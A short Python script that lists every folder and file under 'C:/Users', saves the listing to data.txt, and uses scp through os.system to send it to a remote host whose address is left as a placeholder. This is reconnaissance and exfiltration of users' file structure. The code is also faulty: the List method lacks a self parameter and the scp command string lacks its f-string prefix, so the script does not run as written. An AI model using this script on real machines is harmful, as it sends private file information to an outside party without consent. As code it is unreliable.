import os

class List_Folder:
    def __init__(self):
        pass

    def List(root_dir):
        file_structure = {}
        
        for foldername, subfolders, filenames in os.walk(root_dir):
            relative_path = os.path.relpath(foldername, root_dir)
            parent_folder = os.path.dirname(relative_path)
            folder_name = os.path.basename(relative_path)
            
            if parent_folder not in file_structure:
                file_structure[parent_folder] = []
            
            file_structure[parent_folder].append({
                folder_name: filenames
            })
        
        return file_structure

# Specify the root directory to start traversal from
root_directory = 'C:/Users'

data = str(List_Folder().List(root_directory))
with open("data.txt", "w") as file:
    file.write(data)

remote_ip = "<Enter a valid Ip as string>"
remote_location = "<Enter loaction where file must be stored>"

try:
    os.system("scp -i key.pem data.txt ubuntu@{remote_ip}:{remote_location}")
except:
    raise ConnectionError